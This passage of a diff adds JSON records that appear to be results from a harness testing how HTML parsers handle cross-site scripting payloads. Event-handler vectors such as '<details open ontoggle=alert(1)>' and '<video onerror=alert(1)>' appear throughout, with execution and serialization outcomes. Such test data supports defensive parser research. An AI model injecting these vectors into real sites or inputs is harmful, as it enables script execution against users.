+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<img src=\"&lt;body onresize=__x()&gt;\" alt=\"a\">"
+  },
+  {
+   "payload": "<body onscroll=alert(1)>",
+   "family": "portswigger_events",
+   "host": "event_dq",
+   "document": "<html><body><img src=\"<body onscroll=__x()>\" alt=\"a\"></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<img src=\"&lt;body onscroll=__x()&gt;\" alt=\"a\">"
+  },
+  {
+   "payload": "<body onscrollend=alert(1)>",
+   "family": "portswigger_events",
+   "host": "event_dq",
+   "document": "<html><body><img src=\"<body onscrollend=__x()>\" alt=\"a\"></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<img src=\"&lt;body onscrollend=__x()&gt;\" alt=\"a\">"
+  },
+  {
+   "payload": "<body onscrollsnapchange=alert(1)>",
+   "family": "portswigger_events",
+   "host": "event_dq",
+   "document": "<html><body><img src=\"<body onscrollsnapchange=__x()>\" alt=\"a\"></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<img src=\"&lt;body onscrollsnapchange=__x()&gt;\" alt=\"a\">"
+  },
+  {
+   "payload": "<body onmessage=alert(1)>",
+   "family": "portswigger_events",
+   "host": "event_dq",
+   "document": "<html><body><img src=\"<body onmessage=__x()>\" alt=\"a\"></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<img src=\"&lt;body onmessage=__x()&gt;\" alt=\"a\">"
+  },
+  {
+   "payload": "<body onunhandledrejection=alert(1)>",
+   "family": "portswigger_events",
+   "host": "event_dq",
+   "document": "<html><body><img src=\"<body onunhandledrejection=__x()>\" alt=\"a\"></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<img src=\"&lt;body onunhandledrejection=__x()&gt;\" alt=\"a\">"
+  },
+  {
+   "payload": "<body onpagereveal=alert(1)>",
+   "family": "portswigger_events",
+   "host": "event_dq",
+   "document": "<html><body><img src=\"<body onpagereveal=__x()>\" alt=\"a\"></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<img src=\"&lt;body onpagereveal=__x()&gt;\" alt=\"a\">"
+  },
+  {
+   "payload": "<style>@keyframes x{}</style><b style=\"animation-name:x\" onanimationend=alert(1)>",
+   "family": "portswigger_events",
+   "host": "event_dq",
+   "document": "<html><body><img src=\"<style>@keyframes x{}</style><b style=\"animation-name:x\" onanimationend=__x()>\" alt=\"a\"></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<img src=\"&lt;style&gt;@keyframes x{}&lt;/style&gt;&lt;b style=\" animation-name:x\"=\"\" onanimationend=\"__x()\">\" alt=\"a\"&gt;"
+  },
+  {
+   "payload": "<details open ontoggle=alert(1)//>",
+   "family": "html5_new",
+   "host": "text",
+   "document": "<html><body><div><details open ontoggle=__x()//></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": true,
+   "exec_ihn1": true,
+   "serialized": "<div><details open=\"\" ontoggle=\"__x()//\"></details></div>"
+  },
+  {
+   "payload": "<details open ontoggle=alert`1`>",
+   "family": "html5_new",
+   "host": "text",
+   "document": "<html><body><div><details open ontoggle=alert`1`></div></body></html>",
+   "sentinel_present": false,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<div><details open=\"\" ontoggle=\"alert`1`\"></details></div>"
+  },
+  {
+   "payload": "<details ontoggle=alert(1) open>",
+   "family": "html5_new",
+   "host": "text",
+   "document": "<html><body><div><details ontoggle=__x() open></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": true,
+   "exec_ihn1": true,
+   "serialized": "<div><details ontoggle=\"__x()\" open=\"\"></details></div>"
+  },
+  {
+   "payload": "<summary onclick=alert(1)>x</summary>",
+   "family": "html5_new",
+   "host": "text",
+   "document": "<html><body><div><summary onclick=__x()>x</summary></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<div><summary onclick=\"__x()\">x</summary></div>"
+  },
+  {
+   "payload": "<dialog open onload=alert(1)>",
+   "family": "html5_new",
+   "host": "text",
+   "document": "<html><body><div><dialog open onload=__x()></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<div><dialog open=\"\" onload=\"__x()\"></dialog></div>"
+  },
+  {
+   "payload": "<dialog open onclose=alert(1)>",
+   "family": "html5_new",
+   "host": "text",
+   "document": "<html><body><div><dialog open onclose=__x()></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<div><dialog open=\"\" onclose=\"__x()\"></dialog></div>"
+  },
+  {
+   "payload": "<menu onclick=alert(1)>",
+   "family": "html5_new",
+   "host": "text",
+   "document": "<html><body><div><menu onclick=__x()></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<div><menu onclick=\"__x()\"></menu></div>"
+  },
+  {
+   "payload": "<menuitem onclick=alert(1)>",
+   "family": "html5_new",
+   "host": "text",
+   "document": "<html><body><div><menuitem onclick=__x()></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<div><menuitem onclick=\"__x()\"></menuitem></div>"
+  },
+  {
+   "payload": "<picture onload=alert(1)>",
+   "family": "html5_new",
+   "host": "text",
+   "document": "<html><body><div><picture onload=__x()></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<div><picture onload=\"__x()\"></picture></div>"
+  },
+  {
+   "payload": "<source onerror=alert(1)>",
+   "family": "html5_new",
+   "host": "text",
+   "document": "<html><body><div><source onerror=__x()></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<div><source onerror=\"__x()\"></div>"
+  },
+  {
+   "payload": "<track onload=alert(1)>",
+   "family": "html5_new",
+   "host": "text",
+   "document": "<html><body><div><track onload=__x()></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<div><track onload=\"__x()\"></div>"
+  },
+  {
+   "payload": "<video onerror=alert(1)>",
+   "family": "html5_new",
+   "host": "text",
+   "document": "<html><body><div><video onerror=__x()></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<div><video onerror=\"__x()\"></video></div>"
+  },
+  {
+   "payload": "<video onloadstart=alert(1)>",
+   "family": "html5_new",
+   "host": "text",
+   "document": "<html><body><div><video onloadstart=__x()></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<div><video onloadstart=\"__x()\"></video></div>"
+  },
+  {
+   "payload": "<video oncanplay=alert(1)>",
+   "family": "html5_new",
+   "host": "text",
+   "document": "<html><body><div><video oncanplay=__x()></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<div><video oncanplay=\"__x()\"></video></div>"
+  }
+ ]
+}
